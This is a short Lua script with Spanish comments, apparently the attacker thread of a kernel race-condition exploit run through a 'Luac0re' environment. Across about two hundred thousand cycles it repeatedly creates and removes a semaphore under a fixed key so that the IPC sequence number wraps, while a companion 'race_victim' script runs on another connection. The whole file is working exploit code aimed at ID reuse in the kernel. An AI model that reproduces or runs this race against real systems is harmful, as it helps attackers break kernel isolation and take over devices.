-- exp20_race_attacker.lua — HILO A: martilleo RMID/create para envolver seq (mod 0x8000)
-- Ejecutar en UNA conexión Luac0re mientras race_victim corre en OTRA.
local E = require("common_1352")
local cycles = tonumber(arg and arg[1]) or 200000

E.log("ATK", "martilleando semget/RMID x%d en índice fijo", cycles)
local hits = 0
for i = 1, cycles do
    -- key fijo distinto de IPC_PRIVATE para reusar el mismo índice
    local sid = syscall.semget(0x1352, 8, E.IPC_CREAT + 0x1B6)
    if sid and sid >= 0 then
        syscall.__semctl(sid, 0, E.IPC_RMID, 0)
        hits = hits + 1
    end
end
E.log("ATK", "fin: %d ciclos completados", hits)
